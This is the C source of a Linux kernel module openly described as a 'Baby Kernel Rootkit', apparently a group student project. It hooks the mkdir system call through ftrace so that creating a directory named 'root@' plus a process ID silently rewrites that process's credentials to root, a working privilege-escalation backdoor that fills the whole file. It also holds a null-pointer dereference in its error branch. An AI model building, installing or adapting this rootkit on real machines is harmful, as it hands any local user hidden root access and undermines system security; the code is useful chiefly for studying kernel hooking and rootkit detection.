#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("Group 10");
MODULE_DESCRIPTION("Baby Kernel Rootkit");
MODULE_VERSION("1.0.0");

#include "hook.h"

void set_root(unsigned task_pid)
{
    struct pid *proc_pid = find_vpid(task_pid);
    struct task_struct *task;
    struct cred *root;

    if(!proc_pid)
        return;
    
    task = pid_task(proc_pid, PIDTYPE_PID);

    if (task == NULL) {
      printk("rootkit: Failed to get this task info.\n");
      return;
    }

    root = prepare_creds();

    if (root == NULL){
        printk(KERN_ALERT "??NULL ==> %d", root->uid.val);
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    
    rcu_assign_pointer(task->cred, root);

    printk(KERN_ALERT "rootkit: Process #%d is root now.\n", task_pid);
}

static asmlinkage long (*orig_mkdir)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Hook mkdir success.\n");
    
    if(strncmp(dir_name, "root@", 5) == 0)
    {
        set_root((unsigned)simple_strtol(&dir_name[5],(char **)(dir_name),10));
    } else {
        orig_mkdir(regs);
    }

    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
};


static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded.\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);